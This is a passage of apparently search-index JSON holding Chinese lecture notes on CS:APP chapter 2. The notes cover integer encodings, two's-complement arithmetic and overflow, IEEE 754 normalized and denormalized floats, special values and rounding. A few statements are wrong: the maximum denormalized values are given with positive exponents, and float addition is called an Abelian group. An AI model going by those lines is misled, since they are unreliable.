\\(V = (-1)^s\\times M\\times 2^E\\) \u5373\u53ef\u8ba1\u7b97\u51fa\u6240\u8868\u793a\u7684\u503c \u89c4\u7ea6\u5f62\u5f0f\u53ef\u4ee5\u8868\u793a\u7684\u6240\u6709\u6570\u7684\u95f4\u8ddd\u662f\u4e0d\u4e00\u81f4\u7684\uff0c\u4e14\u8d8a\u63a5\u8fd1 0 \u8d8a\u5bc6\u96c6 \u5728\u89c4\u7ea6\u5f62\u5f0f\u4e0b\u53ef\u4ee5\u8868\u793a\u7684\u6570\u7684\u8303\u56f4\uff1a \u5355\u7cbe\u5ea6 \u6700\u5c0f\u6b63\uff080 0...01 0...00\uff09 \\(1\\times 2^{-126}\\) \uff08 \\(1.2\\times 10^{-38}\\) \uff09 \u6700\u5927\u6b63\uff080 1...10 1...11\uff09 \\((2-2^{-23})\\times 2^{127}\\) \uff08 \\(3.4\\times 10^{38}\\) \uff09 \u53cc\u7cbe\u5ea6 \u6700\u5c0f\u6b63\uff080 0...01 0...00\uff09 \\(1\\times 2^{-1022}\\) \uff08 \\(2.2\\times 10^{-308}\\) \uff09 \u6700\u5927\u6b63\uff080 1...10 1...11\uff09 \\((2-2^{-52})\\times 2^{1023}\\) \uff08 \\(1.8\\times 10^{308}\\) \uff09 \u975e\u89c4\u7ea6\u5f62\u5f0f \u00b6 \u5728\u8fd9\u79cd\u5f62\u5f0f\u4e0b\u9636\u7801\u5168\u4e3a 0\uff0c\u8fd9\u79cd\u5f62\u5f0f\u7684\u76ee\u7684\u662f\u8868\u793a 0 \u4ee5\u53ca\u63a5\u8fd1 0 \u7684\u503c \u540c\u6837 \\(s\\) \u76f4\u63a5\u8868\u793a\u6b63\u8d1f\uff0c \\(E\\) \u3001 \\(M\\) \uff1a \\(E = 1 - Bias = -2^{k-1} + 2\\) \\(M = f = 0.f_{n-1}\\cdots f_1f_0\\) \u800c\u5728\u6d6e\u70b9\u6570\u8868\u793a\u6cd5\u4e0b\uff0c0 \u6709\u4e24\u79cd\uff0c\u5373 \\(s=0\\) \u4e14\u540e\u9762\u5168\u4e3a 0 \u7684 +0.0\uff0c\u4ee5\u53ca \\(s=1\\) \u4e14\u540e\u9762\u5168\u4e3a 0 \u7684 -0.0 \u5b83\u4eec\u6709\u65f6\u89c6\u4e3a\u76f8\u7b49\uff0c\u4f46\u4e5f\u6709\u65f6\u4f1a\u89c6\u4e3a\u4e0d\u76f8\u7b49 \u975e\u89c4\u7ea6\u5f62\u5f0f\u8868\u793a\u7684\u6240\u6709\u6570\u7684\u95f4\u8ddd\u662f\u4e00\u81f4\u7684\uff0c\u5b83\u4eec\u7684\u95f4\u8ddd\u4e5f\u5c31\u662f\u7528\u975e\u89c4\u7ea6\u5f62\u5f0f\u53ef\u8868\u793a\u7684\u6700\u5c0f\u6b63\u6570 \\(2^{-n}\\times 2^{-2^{k-1}+2}\\) \u975e\u89c4\u7ea6\u5f62\u5f0f\u53ef\u8868\u793a\u7684\u6570\u7684\u8303\u56f4\uff1a \u5355\u7cbe\u5ea6 \u6700\u5c0f\u6b63\uff080 0...00 0...01\uff09 \\(2^{-23}\\times 2^{-126}\\) \uff08 \\(1.4\\times 10^{-45}\\) \uff09 \u6700\u5927\u6b63\uff080 0...00 1...11\uff09 \\((1-2^{-23})\\times 2^{126}\\) \uff08 \\(1.2\\times 10^{38}\\) \uff09 \u53cc\u7cbe\u5ea6 \u6700\u5c0f\u6b63\uff080 0...00 0...01\uff09 \\(2^{-52}\\times 2^{-1022}\\) \uff08 \\(4.9\\times 10^{-324}\\) \uff09 \u6700\u5927\u6b63\uff080 0...00 1...11\uff09 \\((1-2^{-52})\\times 2^{1022}\\) \uff08 \\(2.2\\times 10^{-308}\\) \uff09 \u7279\u6b8a\u503c \u00b6 \u6d6e\u70b9\u6570\u4e5f\u53ef\u4ee5\u7528\u6765\u8868\u793a\u4e00\u4e9b\u7279\u6b8a\u503c\uff0c\u5373 \\(+\\infty\\) \u3001 \\(-\\infty\\) \u4ee5\u53ca NaN\uff08not a number\uff09 \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u9636\u7801\u5168\u4e3a 1\uff0c\u5177\u4f53\u4e09\u79cd\u60c5\u51b5\uff1a \u5206\u6570\u90e8\u5206\u5168\u4e3a 0\uff0c\u4e14 \\(s=0\\) \uff0c\u8868\u793a \\(+\\infty\\) \u5206\u6570\u90e8\u5206\u5168\u4e3a 0\uff0c\u4e14 \\(s=1\\) \uff0c\u8868\u793a \\(-\\infty\\) \u5206\u6570\u90e8\u5206\u4e0d\u5168\u4e3a 0\uff0c\u8868\u793a NaN \u820d\u5165 \u00b6 \u820d\u5165\uff08rounding\uff09\u6709\u56db\u79cd\uff1a\u5411\u5076\u820d\u5165\uff08round-to-even\uff09\u3001\u5411 0 \u820d\u5165\uff08round-toward-zero\uff09\u3001\u5411\u4e0b\u820d\u5165\uff08round-down\uff09\u3001\u5411\u4e0a\u820d\u5165\uff08round-up\uff09 \u9ed8\u8ba4\u662f round-to-even \u5982\u679c\u6709\u4e00\u4e2a\u4e8c\u8fdb\u5236\u5c0f\u6570\uff1aX...XX.Y...Yabcd...\uff0c\u8981\u820d\u5165\u5230 a \u7684\u4f4d\u7f6e \u5982\u679c bcd \u5c0f\u4e8e 100 2 \uff0c\u5219\u76f4\u63a5\u820d\u53bb bcd \u5982\u679c bcd \u5927\u4e8e 100 2 \uff0c\u5219\u5411 a \u8fdb\u4e00\u4f4d \u5982\u679c bcd \u7b49\u4e8e 100 2 \u5982\u679c a \u4e3a 0\uff08\u5076\uff09\uff0c\u5219\u820d\u53bb bcd \u5982\u679c a \u4e3a 1\uff08\u5947\uff09\uff0c\u5219\u5411 a \u8fdb\u4e00\u4f4d \u6d6e\u70b9\u6570\u52a0\u6cd5 \u00b6 \u4f1a\u5b58\u5728\u820d\u5165\u95ee\u9898 \u662f\u963f\u8d1d\u5c14\u7fa4\uff0c\u6ee1\u8db3\u4ea4\u6362\u5f8b\uff0c\u4f46\u4e0d\u6ee1\u8db3\u7ed3\u5408\u5f8b","title":"\u6570\u636e\u7684\u8868\u793a"},{"location":"cs/system/cs1/topic1/#_1","text":"Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u7b2c\u4e8c\u5468\u8bfe\u7a0b\u5185\u5bb9 \u53c2\u8003\uff1a Computer System: A Programmer's Perspective (3rd.) Chapter 2: Representing and Manipulating Information","title":"\u6570\u5b57\u7684\u8868\u793a\u548c\u5904\u7406"},{"location":"cs/system/cs1/topic1/#_2","text":"","title":"\u6574\u6570\u8868\u793a\u6cd5"},{"location":"cs/system/cs1/topic1/#_3","text":"\u65e0\u7b26\u53f7\u6574\u578b\u4e00\u822c\u76f4\u63a5\u4f7f\u7528\u5176\u4e8c\u8fdb\u5236\uff08\u539f\u7801\uff09\u6765\u8868 \u6bd4\u5982\u6709\u4e00\u4e2a \\(w\\) \u4f4d\u7684\u6bd4\u7279\u5e8f\u5217 \\(\\overrightarrow{x}=[x_{w-1}, x_{w-2}, \\dots, x_0]\\) \uff0c\u5219\u5c06\u5176\u8f6c\u5316\u4e3a\u65e0\u7b26\u53f7\u6574\u6570\uff1a \\[ B2U_w(\\overrightarrow{x}) = \\sum_{i=0}^{w-1}x_i2^i \\] \u53ef\u4ee5\u77e5\u9053 B2U \u662f\u4e00\u4e2a\u53cc\u5c04 \u540c\u65f6\u4e5f\u5bb9\u6613\u77e5\u9053\u65e0\u7b26\u53f7\u6574\u578b\u53ef\u8868\u793a\u7684\u6700\u5927\u503c\u4e3a \\(UMax_{w}=\\displaystyle\\sum_{i=0}^{w-1}2^i=2^w-1\\)","title":"\u65e0\u7b26\u53f7\u6574\u578b"},{"location":"cs/system/cs1/topic1/#_4","text":"\u6700\u5e38\u7528\u7684\u8868\u793a\u6709\u7b26\u53f7\u6574\u578b\u7684\u65b9\u6cd5\u662f\u8865\u7801\uff08Two's-Complement\uff09 \u5bf9\u4e8e\u6bd4\u7279\u5e8f\u5217 \\(\\overrightarrow{x}=[x_{w-1}, x_{w-2}, \\dots, x_0]\\) \uff0c\u5c06\u5176\u89c6\u4e3a\u8865\u7801\u8f6c\u6362\u4e3a\u6709\u7b26\u53f7\u6574\u6570\uff1a \\[ B2T_w(\\overrightarrow{x}) = -x_{w-1}2^{w-1} + \\sum_{i=0}^{w-2}x_i2^i \\] \u5b83\u7684\u6700\u9ad8\u4f4d\uff08MSB\uff09\u662f\u7b26\u53f7\u4f4d\uff0c\u5982\u679c\u662f 1 \u5219\u8868\u793a\u662f\u8d1f\u6570\uff0c0 \u5219\u662f\u6b63\u6570 \u5e76\u4e14\u5bf9\u4e8e\u6b63\u6570\uff0c\u5b83\u5bf9\u5e94\u7684\u6bd4\u7279\u5e8f\u5217\u5c31\u662f\u5176\u4e8c\u8fdb\u5236 \u800c\u5bf9\u4e8e\u8d1f\u6570\uff0c\u5219\u4f7f\u7528\u8865\u7801\uff0c\u5373 \\(-x = \\sim x + 1 (x > 0)\\) \u4ece\u53e6\u4e00\u4e2a\u89d2\u5ea6\u6765\u770b\uff0c\u5b83\u5b9e\u9645\u4e0a\u5c31\u662f\u6539\u53d8\u4e86 MSB \u7684\u6743\u91cd\uff0c\u4ece \\(2^{w-1}\\) \u6539\u4e3a\u4e86 \\(-2^{w-1}\\) \u540c\u65f6\u4e5f\u53ef\u4ee5\u8ba1\u7b97\u51fa\u8865\u7801\u53ef\u4ee5\u8868\u793a\u7684\u8303\u56f4 \\(TMin_w=-2^{w-1}\\) \uff0c \\(TMax_w=2^{w-1}-1\\)","title":"\u6709\u7b26\u53f7\u6574\u578b\u8865\u7801\u8868\u793a"},{"location":"cs/system/cs1/topic1/#_5","text":"\u53cd\u7801\uff08Ones' complement\uff09\u4e5f\u662f\u8868\u793a\u6709\u7b26\u53f7\u6574\u578b\u7684\u4e00\u79cd\u65b9\u6cd5\uff0c\u4f46\u662f\u5e76\u4e0d\u5e38\u7528 \u5bf9\u4e8e\u6bd4\u7279\u5e8f\u5217 \\(\\overrightarrow{x}=[x_{w-1}, x_{w-2}, \\dots, x_0]\\) \uff0c\u5c06\u5176\u89c6\u4e3a\u53cd\u7801\u8f6c\u6362\u4e3a\u6709\u7b26\u53f7\u6574\u6570\uff1a \\[ B2O_w(\\overrightarrow{x}) = -x_{w-1}(2^{w-1}-1) + \\sum_{i=0}^{w-2}x_i2^i \\] \u76f8\u8f83\u4e8e\u8865\u7801\uff0c\u5b83\u4eec\u5728\u6b63\u6570\u4e0a\u662f\u4e00\u6837\u7684 \u4f46\u662f\u5bf9\u4e8e\u8d1f\u6570\uff0c\u53cd\u7801\u8868\u793a\u4e0b\u662f \\(-x = \\sim x (x > 0)\\) \u5728\u53e6\u4e00\u4e2a\u89d2\u5ea6\uff0c\u5b83\u7684 MSB \u7684\u6743\u91cd\u662f \\(2^{w-1}-1\\) \u5b83\u7684\u7f3a\u70b9\u662f 0 \u6709\u4e24\u79cd\u8868\u793a\uff0c\u5373 +0 [00...0] \u548c -0 [11...1]","title":"\u6709\u7b26\u53f7\u6574\u578b\u53cd\u7801\u8868\u793a"},{"location":"cs/system/cs1/topic1/#_6","text":"C \u8bed\u8a00\u4e2d\u5f3a\u5236\u8f6c\u6362\u6709\u7b26\u53f7\u548c\u65e0\u7b26\u53f7\u6574\u578b\u5e76\u4e0d\u6539\u53d8\u6bd4\u7279\u5e8f\u5217\uff0c\u800c\u662f\u6539\u53d8\u8bfb\u53d6\u7684\u65b9\u5f0f \u5373\u4ece\u6709\u7b26\u53f7\u8f6c\u4e3a\u65e0\u7b26\u53f7\u5c31\u662f\u901a\u8fc7\u539f\u7801\u6765\u89e3\u8bfb\u539f\u6765\u8865\u7801\u7684\u4e8c\u8fdb\u5236 \u4ece\u65e0\u7b26\u53f7\u8f6c\u4e3a\u6709\u7b26\u53f7\u5c31\u662f\u901a\u8fc7\u8865\u7801\u89e3\u8bfb\u539f\u6765\u539f\u7801\u7684\u4e8c\u8fdb\u5236 \\[ T2U_w(x) = B2U_w(T2B_w(x)) \\] \u5e76\u4e14\u53ef\u4ee5\u53d1\u73b0\u539f\u7801\u548c\u8865\u7801\u53ea\u5dee\u4e86 MSB \u7684\u6743\u91cd\u4ece\u6b63\u5230\u8d1f\uff0c\u6240\u4ee5 \\(T2U_w(x) = x + x_{w-1}2^w\\) \uff0c\u4e5f\u5c31\u662f\uff1a \\[ T2U_w(x) = \\begin{cases}x+2^w, &x<0\\\\x, &x\\geq 0\\end{cases} \\] \u5bf9\u4e8e\u65e0\u7b26\u53f7\u8f6c\u6709\u7b26\u53f7\uff1a \\[ U2T_w(x) = B2T_w(U2B_w(x)) \\] \u540c\u65f6\uff1a \\[ U2T_w(x) = \\begin{cases}x, &x\\leq TMax_w=2^{w-1}-1\\\\x-2^w, &x > TMax_w=2^{w-1}-1\\end{cases} \\]","title":"\u65e0\u7b26\u53f7\u4e0e\u6709\u7b26\u53f7\u8f6c\u6362"},{"location":"cs/system/cs1/topic1/#_7","text":"","title":"\u6574\u6570\u8fd0\u7b97"},{"location":"cs/system/cs1/topic1/#_8","text":"\u5bf9\u4e8e\u4e24\u4e2a\u65e0\u7b26\u53f7\u6574\u578b \\(x, y\\in[0, 2^w)\\) \uff0c\u5b83\u4eec\u505a\u52a0\u6cd5\u540e\u7684\u7ed3\u679c\u5728 \\(w+1\\) \u4f4d\u4e0b\u624d\u80fd\u5b8c\u5168\u8868\u793a\u51fa\u6765 \u4f46\u662f\u7ed3\u679c\u4e00\u5b9a\u8fd8\u8981\u8868\u793a\u5728 \\(w\\) \u4f4d\u4e0b\u8868\u793a\uff0c\u8fd9\u65f6\u5c31\u8981\u5bf9\u6ea2\u51fa\u90e8\u5206\u622a\u65ad\uff0c\u5373\u76f4\u63a5\u53bb\u6389\u6700\u9ad8\u4f4d \\[ x+_w^\\mathrm{u}y = (x+y)\\bmod{2^w} \\] \u5373\uff1a \\[ x+_w^\\mathrm{u}y = \\begin{cases} x + y, &x + y < 2^w\\quad \\text{Normal}\\\\ x + y - 2^w, &2^w\\leq x + y < 2^{w + 1}\\quad \\text{Overflow} \\end{cases} \\]","title":"\u65e0\u7b26\u53f7\u6574\u578b\u52a0\u6cd5"},{"location":"cs/system/cs1/topic1/#_9","text":"\u51cf\u6cd5\u5373\u52a0\u4e0a\u51cf\u6570\u53d6\u8d1f\uff0c\u6240\u4ee5\u53ea\u8981\u77e5\u9053\u5982\u4f55\u53d6\u8d1f\u5373\u53ef \u5bf9\u4e8e 0\uff0c\u53d6\u8d1f\u540e\u4e00\u5b9a\u4e5f\u4e3a 0 \u800c\u5bf9\u4e8e\u975e 0 \u6570\uff0c\u56e0\u4e3a\u53d6\u8d1f\u540e\u52a0\u4e0a\u539f\u6570\u4e3a 0\uff08 \\(2^w\\) \u622a\u65ad\u540e\uff09\uff0c\u6240\u4ee5\u53d6\u8d1f\u5373\u7528 \\(2^w\\) \u51cf\u53bb\u539f\u6570\uff1a \\[ -_w^\\mathrm{u}x = \\begin{cases}x, &x=0\\\\2^w-x, &x>0\\end{cases} \\]","title":"\u65e0\u7b26\u53f7\u6574\u578b\u51cf\u6cd5"},{"location":"cs/system/cs1/topic1/#_10","text":"\u4f7f\u7528\u8865\u7801\u8868\u793a\u6709\u7b26\u53f7\u6574\u578b\u8fdb\u884c\u52a0\u6cd5\u65f6\uff0c\u4f1a\u9047\u5230\u4e24\u79cd\u7279\u6b8a\u60c5\u51b5\uff1a \u52a0\u6cd5\u540e\u7684\u7ed3\u679c\u592a\u5927\uff0c\u8d85\u8fc7 \\(2^{w-1} - 1\\) \uff0c\u6b63\u6ea2\u51fa\uff08Positive overflow\uff09 \u52a0\u6cd5\u540e\u7684\u7ed3\u679c\u592a\u5c0f\uff0c\u5c0f\u4e8e \\(-2^{w-1}\\) \uff0c\u8d1f\u6ea2\u51fa\uff08Negative overflow\uff09 \u6240\u4ee5\u4e5f\u9700\u8981\u5bf9\u7ed3\u679c\u8fdb\u884c\u622a\u65ad\u5904\u7406\uff1a \\[ x+_w^\\mathrm{t}y = \\begin{cases} x+y-2^w, & 2^{w-1}\\leq x + y \\quad \\text{Positive overflow}\\\\ x+y, &-2^{w-1}\\leq x+y < 2^{w-1}\\quad \\text{Normal}\\\\ x+y+2^w, &x+y < -2^{w-1}\\quad \\text{Negative overflow} \\end{cases} \\] \u4ece\u6bd4\u7279\u5e8f\u5217\u89d2\u5ea6\u6765\u770b\uff0c\u4e5f\u5c31\u662f\u76f4\u63a5\u89c6\u4e3a\u4e8c\u8fdb\u5236\u5e8f\u5217\u76f8\u52a0\uff0c\u518d\u8f6c\u56de\u8865\u7801\u8868\u793a\u7684\u503c\uff1a \\[ x+_w^\\mathrm{t}y=U2T_w(T2U_w(x)+_w^\\mathrm{u}T2U_w(y)) \\]","title":"\u8865\u7801\u8868\u793a\u4e2d\u52a0\u6cd5"},{"location":"cs/system/cs1/topic1/#_11","text":"\u540c\u6837\uff0c\u4e5f\u662f\u53ea\u8003\u8651\u53d6\u8d1f\u5373\u53ef \u4f46\u662f\u548c\u539f\u7801\u4e0d\u540c\uff0c\u5b83\u672c\u8eab\u5c31\u5e26\u6b63\u8d1f\uff0c\u6240\u4ee5\u53d6\u8d1f\u5219\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\uff08\u5373\u53d6\u53cd\u52a0\u4e00\uff09 \u4f46\u6709\u4e00\u4e2a\u7279\u6b8a\uff0c\u4e5f\u5c31\u662f\u6700\u5c0f\u7684 \\(-2^{w-1}\\) \uff0c\u8d1f\u7684\u5b83 \\(2^{w-1}\\) \u5e76\u4e0d\u5728\u8865\u7801\u7684\u8303\u56f4\u4e2d \u800c \\(TMin_w+_w^\\mathrm{t}TMin_w=-2^{w-1}-2^{w-1}=-2^w\\) \uff0c\u622a\u65ad\u540e\u6070\u597d\u4e3a 0 \u6240\u4ee5 \\(-TMin_w = TMin_w\\) \uff0c\u5373\uff1a \\[ -_w^\\mathrm{t}x = \\begin{cases} -2^{w-1}, &x = -2^{w-1}\\\\ -x, &x > -2^{w-1} \\end{cases} \\]","title":"\u8865\u7801\u8868\u793a\u4e2d\u7684\u51cf\u6cd5"},{"location":"cs/system/cs1/topic1/#_12","text":"\u6574\u578b\u7684\u4e58\u6cd5\u5747\u662f\u76f4\u63a5\u5c06\u539f\u7801/\u8865\u7801\u7684\u4e8c\u8fdb\u5236\u76f8\u4e58\uff0c\u7136\u540e\u76f4\u63a5\u622a\u65ad\u81f3 \\(w\\) \u4f4d \\[ x*_w^\\mathrm{t}y = U2T_w(x*_w^\\mathrm{u}y) = U2T_w(x*y\\bmod 2^w) \\] \u5e76\u4e14\u4e58\u4ee5\u5e38\u6570\u53ef\u4ee5\u901a\u8fc7\u79fb\u4f4d\u6765\u8fdb\u884c\uff0c\u6bd4\u5982\uff1a x * 2 k = x < < k x * 14 = (x < < 3) + (x < < 2) + (x < < 1)","title":"\u4e58\u6cd5"},{"location":"cs/system/cs1/topic1/#_13","text":"","title":"\u9664\u4ee5\u4e8c\u7684\u5e42\u6b21"},{"location":"cs/system/cs1/topic1/#_14","text":"\u524d\u9762\u7684\u6574\u578b\u90fd\u662f\u4e00\u79cd\u5b9a\u70b9\u6570\uff08fixed point\uff09\uff0c\u5373\u5c0f\u6570\u70b9\u7684\u4f4d\u7f6e\u662f\u56fa\u5b9a\u7684\uff08\u56fa\u5b9a\u5728\u672b\u5c3e\uff09\uff0c\u5b83\u7684\u7f3a\u70b9\u662f\u8303\u56f4\u56fa\u5b9a \u800c\u6d6e\u70b9\u6570\uff08floating point\uff09\u7684\u5c0f\u6570\u70b9\u4f4d\u7f6e\u5219\u4e0d\u662f\u56fa\u5b9a\u7684\uff0c\u5b83\u4f7f\u7528 \\(x*2^y\\) \u7684\u5f62\u5f0f\u6765\u8868\u793a\u4e00\u4e2a\u6570 \u4e5f\u56e0\u6b64\u53ef\u4ee5\u8868\u793a\u5f88\u5927\u6216\u8005\u5f88\u5c0f\u7684\u6570 \u5e38\u7528\u7684\u6d6e\u70b9\u6570\u8868\u793a\u65b9\u6cd5\u662f\u7531 IEEE 754 \u6807\u51c6\u6307\u5b9a\u7684 IEEE \u6d6e\u70b9\u6570\u8868\u793a\u6cd5\u90fd\u901a\u8fc7 \\(V=(-1)^s\\times M\\times 2^E\\) \u7684\u5f62\u5f0f\u6765\u8868\u793a\uff0c\u5176\u4e2d\uff1a \\(s\\) \uff1a\u7b26\u53f7\uff08sign\uff09\uff0c1 \u5219\u8868\u793a\u662f\u8d1f\u6570\uff0c0 \u5219\u8868\u793a\u662f\u6b63\u6570 \\(M\\) \uff1a\u5c3e\u6570\uff08mantissa\uff09\u6216\u79f0\u6709\u6548\u6570\u5b57\uff08significand\uff09 \\(E\\) \uff1a\u6307\u6570\uff08exponent\uff09 \u5b83\u4eec\u7684\u5b58\u50a8\u65b9\u5f0f\u662f\uff1a \u6700\u9ad8\u4f4d\u6bd4\u7279\u8868\u793a \\(s\\) \u540e\u63a5 \\(k\\) \u6bd4\u7279 \\([e_{k-1}\\cdots e_1e_0]\\) \u6307\u6570\u90e8\u5206\uff08\u4e5f\u79f0\u4e3a\u9636\u7801\uff09\u7f16\u7801\u4e86 \\(E\\) \u6700\u540e\u662f \\(n\\) \u4e2a\u6bd4\u7279 \\([f_{n-1}\\cdots f_1f_0]\\) \u5206\u6570\u90e8\u5206\uff0c\u7f16\u7801\u4e86 \\(M\\) \u5e76\u4e14\u6709\u4e24\u79cd\u6700\u5e38\u89c1\u7684\u683c\u5f0f\uff0c\u5373\uff1a \u5355\u7cbe\u5ea6\uff08single-precision floating-point\uff09\uff0c \\(k=8\\) \uff0c \\(n=23\\) \uff0c32 \u4f4d\uff084 \u5b57\u8282\uff09\u5b58\u50a8 \u53cc\u7cbe\u5ea6\uff08double-precision floating-point\uff09\uff0c \\(k=11\\) \uff0c \\(n=52\\) \uff0c64 \u4f4d\uff088 \u5b57\u8282\uff09\u5b58\u50a8 IEEE \u6d6e\u70b9\u6570\u503c\u8fd8\u6709\u4e09\u79cd\u5f62\u5f0f\uff0c\u4e0b\u9762\u5206\u522b\u63cf\u8ff0","title":"\u6d6e\u70b9\u6570\u8868\u793a\u6cd5"},{"location":"cs/system/cs1/topic1/#_15","text":"\u8fd9\u79cd\u5f62\u5f0f\u4e0b\u7684\u9636\u7801\u4e0d\u5168\u4e3a 0 \u4e5f\u4e0d\u5168\u4e3a 1\uff0c\u662f\u6700\u5e38\u89c1\u7684\u5f62\u5f0f \u8fd9\u79cd\u5f62\u5f0f\u4e0b\u7684 \\(s\\) \u76f4\u63a5\u8868\u793a\u6b63\u8d1f\uff0c\u800c \\(E\\) \u3001 \\(M\\) \u7684\u89c4\u5219\uff1a \\(E\\) \u901a\u8fc7 \u79fb\u7801 \uff08biased\uff09\u8868\u793a\u6210 \u9636\u7801 \\([e_{k-1}\\cdots e_1e_0]\\) \uff0c\u79fb\u4f4d \\(Bias = 2^{k-1}-1\\) \uff0c \\(E = e - Bias\\) \uff08\u5176\u4e2d \\(e\\) \u4e3a\u5c06\u9636\u7801\u8f6c\u4e3a\u65e0\u7b26\u53f7\u6574\u578b\u7684\u503c\uff09\uff0c\u8fd9\u53ef\u4ee5\u4f7f\u9636\u7801\u90e8\u5206\u8303\u56f4\u4ece \\([1, 2^k-2]\\) \u53d8\u4e3a \\([-2^{k-1}+2, 2^{k-1}-1]\\) \\(M = 1+f\\) \uff0c\u5176\u4e2d \\(f = 0.f_{n-1}\\cdots f_1f_0\\in[0, 1)\\) \uff0c\u56e0\u6b64 \\(M=1.f_{n-1}\\cdots f_1f_0\\in[1, 2)\\) \u8ba1\u7b97\u540e\u518d\u901a\u8fc7 \\(V = (-1)^s\\times M\\times 2^E\\) \u5373\u53ef\u8ba1\u7b97\u51fa\u6240\u8868\u793a\u7684\u503c \u89c4\u7ea6\u5f62\u5f0f\u53ef\u4ee5\u8868\u793a\u7684\u6240\u6709\u6570\u7684\u95f4\u8ddd\u662f\u4e0d\u4e00\u81f4\u7684\uff0c\u4e14\u8d8a\u63a5\u8fd1 0 \u8d8a\u5bc6\u96c6 \u5728\u89c4\u7ea6\u5f62\u5f0f\u4e0b\u53ef\u4ee5\u8868\u793a\u7684\u6570\u7684\u8303\u56f4\uff1a \u5355\u7cbe\u5ea6 \u6700\u5c0f\u6b63\uff080 0...01 0...00\uff09 \\(1\\times 2^{-126}\\) \uff08 \\(1.2\\times 10^{-38}\\) \uff09 \u6700\u5927\u6b63\uff080 1...10 1...11\uff09 \\((2-2^{-23})\\times 2^{127}\\) \uff08 \\(3.4\\times 10^{38}\\) \uff09 \u53cc\u7cbe\u5ea6 \u6700\u5c0f\u6b63\uff080 0...01 0...00\uff09 \\(1\\times 2^{-1022}\\) \uff08 \\(2.2\\times 10^{-308}\\) \uff09 \u6700\u5927\u6b63\uff080 1...10 1...11\uff09 \\((2-2^{-52})\\times 2^{1023}\\) \uff08 \\(1.8\\times 10^{308}\\) \uff09","title":"\u89c4\u7ea6\u5f62\u5f0f"},{"location":"cs/system/cs1/topic1/#_16","text":"\u5728\u8fd9\u79cd\u5f62\u5f0f\u4e0b\u9636\u7801\u5168\u4e3a 0\uff0c\u8fd9\u79cd\u5f62\u5f0f\u7684\u76ee\u7684\u662f\u8868\u793a 0 \u4ee5\u53ca\u63a5\u8fd1 0 \u7684\u503c \u540c\u6837 \\(s\\) \u76f4\u63a5\u8868\u793a\u6b63\u8d1f\uff0c \\(E\\) \u3001 \\(M\\) \uff1a \\(E = 1 - Bias = -2^{k-1} + 2\\) \\(M = f = 0.f_{n-1}\\cdots f_1f_0\\) \u800c\u5728\u6d6e\u70b9\u6570\u8868\u793a\u6cd5\u4e0b\uff0c0 \u6709\u4e24\u79cd\uff0c\u5373 \\(s=0\\) \u4e14\u540e\u9762\u5168\u4e3a 0 \u7684 +0.0\uff0c\u4ee5\u53ca \\(s=1\\) \u4e14\u540e\u9762\u5168\u4e3a 0 \u7684 -0.0 \u5b83\u4eec\u6709\u65f6\u89c6\u4e3a\u76f8\u7b49\uff0c\u4f46\u4e5f\u6709\u65f6\u4f1a\u89c6\u4e3a\u4e0d\u76f8\u7b49 \u975e\u89c4\u7ea6\u5f62\u5f0f\u8868\u793a\u7684\u6240\u6709\u6570\u7684\u95f4\u8ddd\u662f\u4e00\u81f4\u7684\uff0c\u5b83\u4eec\u7684\u95f4\u8ddd\u4e5f\u5c31\u662f\u7528\u975e\u89c4\u7ea6\u5f62\u5f0f\u53ef\u8868\u793a\u7684\u6700\u5c0f\u6b63\u6570 \\(2^{-n}\\times 2^{-2^{k-1}+2}\\) \u975e\u89c4\u7ea6\u5f62\u5f0f\u53ef\u8868\u793a\u7684\u6570\u7684\u8303\u56f4\uff1a \u5355\u7cbe\u5ea6 \u6700\u5c0f\u6b63\uff080 0...00 0...01\uff09 \\(2^{-23}\\times 2^{-126}\\) \uff08 \\(1.4\\times 10^{-45}\\) \uff09 \u6700\u5927\u6b63\uff080 0...00 1...11\uff09 \\((1-2^{-23})\\times 2^{126}\\) \uff08 \\(1.2\\times 10^{38}\\) \uff09 \u53cc\u7cbe\u5ea6 \u6700\u5c0f\u6b63\uff080 0...00 0...01\uff09 \\(2^{-52}\\times 2^{-1022}\\) \uff08 \\(4.9\\times 10^{-324}\\) \uff09 \u6700\u5927\u6b63\uff080 0...00 1...11\uff09 \\((1-2^{-52})\\times 2^{1022}\\) \uff08 \\(2.2\\times 10^{-308}\\) \uff09","title":"\u975e\u89c4\u7ea6\u5f62\u5f0f"},{"location":"cs/system/cs1/topic1/#_17","text":"\u6d6e\u70b9\u6570\u4e5f\u53ef\u4ee5\u7528\u6765\u8868\u793a\u4e00\u4e9b\u7279\u6b8a\u503c\uff0c\u5373 \\(+\\infty\\) \u3001 \\(-\\infty\\) \u4ee5\u53ca NaN\uff08not a number\uff09 \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u9636\u7801\u5168\u4e3a 1\uff0c\u5177\u4f53\u4e09\u79cd\u60c5\u51b5\uff1a \u5206\u6570\u90e8\u5206\u5168\u4e3a 0\uff0c\u4e14 \\(s=0\\) \uff0c\u8868\u793a \\(+\\infty\\) \u5206\u6570\u90e8\u5206\u5168\u4e3a 0\uff0c\u4e14 \\(s=1\\) \uff0c\u8868\u793a \\(-\\infty\\) \u5206\u6570\u90e8\u5206\u4e0d\u5168\u4e3a 0\uff0c\u8868\u793a NaN","title":"\u7279\u6b8a\u503c"},{"location":"cs/system/cs1/topic1/#_18","text":"\u820d\u5165\uff08rounding\uff09\u6709\u56db\u79cd\uff1a\u5411\u5076\u820d\u5165\uff08round-to-even\uff09\u3001\u5411 0 \u820d\u5165\uff08round-toward-zero\uff09\u3001\u5411\u4e0b\u820d\u5165\uff08round-down\uff09\u3001\u5411\u4e0a\u820d\u5165\uff08round-up\uff09 \u9ed8\u8ba4\u662f round-to-even \u5982\u679c\u6709\u4e00\u4e2a\u4e8c\u8fdb\u5236\u5c0f\u6570\uff1aX...XX.Y...Yabcd...\uff0c\u8981\u820d\u5165\u5230 a \u7684\u4f4d\u7f6e \u5982\u679c bcd \u5c0f\u4e8e 100 2 \uff0c\u5219\u76f4\u63a5\u820d\u53bb bcd \u5982\u679c bcd \u5927\u4e8e 100 2 \uff0c\u5219\u5411 a \u8fdb\u4e00\u4f4d \u5982\u679c bcd \u7b49\u4e8e 100 2 \u5982\u679c a \u4e3a 0\uff08\u5076\uff09\uff0c\u5219\u820d\u53bb bcd \u5982\u679c a \u4e3a 1\uff08\u5947\uff09\uff0c\u5219\u5411 a \u8fdb\u4e00\u4f4d","title":"\u820d\u5165"},{"location":"cs/system/cs1/topic1/#_19","text":"\u4f1a\u5b58\u5728\u820d\u5165\u95ee\u9898 